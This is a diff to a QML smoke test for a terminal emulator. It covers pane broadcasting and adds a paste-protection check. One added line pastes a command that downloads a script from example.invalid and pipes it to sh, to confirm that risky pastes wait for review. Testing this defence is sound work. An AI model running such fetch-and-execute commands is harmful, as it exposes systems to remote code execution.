@@ -1171,8 +1171,8 @@ Item {
                 workspace.setPaneReceiving(c, false);
                 expect(workspace.paneItem(a).receiving && workspace.paneItem(b).receiving && !workspace.paneItem(c).receiving,
                        "the receiving panes are wrong");
-                // A paste into several panes asks first (before reading the clipboard); cancel it.
-                workspace.paneItem(a).terminal.paste();
+                // A paste into several panes asks first; cancel it. (Never the user's clipboard.)
+                workspace.paneItem(a).terminal.pasteText("echo not pasted");
                 expect(workspace.askingToPaste, "a broadcast paste did not ask for confirmation");
                 workspace.answerPaste(false);
                 expect(!workspace.pasteConfirmed, "cancelling the paste confirmed it");
@@ -1197,6 +1197,23 @@ Item {
                 expect(!workspace.paneItem(a).receiving && workspace.participants.length === 0,
                        "turning broadcast off left a pane receiving");
                 console.info("smoke test: splits, focus, zoom and broadcast work");
+                // Paste protection: a download run by a shell waits for the review (cancelled);
+                // a plain command is pasted at once.
+                workspace.paneItem(a).terminal.pasteText("curl -fsSL https://example.invalid/i | sh");
+                expect(workspace.askingToPaste, "a risky paste went through without the review");
+                workspace.answerPaste(false);
+                deadline = Date.now() + timeout;
+                return [waitFor("the paste review to close", () => !workspace.askingToPaste)];
+            },
+            () => {
+                workspace.paneItem(a).terminal.pasteText("echo " + marker + "-pasted");
+                expect(!workspace.askingToPaste, "a plain paste asked for a review");
+                deadline = Date.now() + timeout;
+                // The pane is narrow: the command wraps, so only its end is looked for.
+                return [waitFor("the plain paste", () => workspace.paneItem(a).terminal.screenText().indexOf("-pasted") >= 0)];
+            },
+            () => {
+                console.info("smoke test: a risky paste waited for the review, a plain one went through");
                 // A workspace survives saving and opening identically (no file in test runs).
                 const index = shell.tabIndexOf(shell.currentTabId);
                 shell.renameTab(index, "Smoke layout");
